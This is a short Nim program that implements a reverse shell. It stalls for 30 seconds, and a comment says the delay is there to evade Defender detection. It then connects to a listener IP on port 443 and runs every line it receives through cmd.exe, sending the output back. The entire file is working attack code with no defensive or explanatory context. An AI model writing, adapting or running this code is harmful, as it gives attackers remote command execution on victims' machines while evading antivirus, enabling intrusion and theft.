import net, osproc, strformat, times

let now1 = now() + 30.seconds # Amount of sleep time (if desired) to prevent detection by Defender
var i = 1

while now() <= now1:
  var i = i + 1

let
  ip = "192.168.1.79" # Listener's IP
  port = 443          # Listener's PORT
  sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "Shell> "
while true:
  send(sock, prompt)
  let bad = recvLine(sock)
  let cmd = execProcess(fmt"cmd.exe /C " & bad) # For UNIX change to bash
  send(sock, cmd)
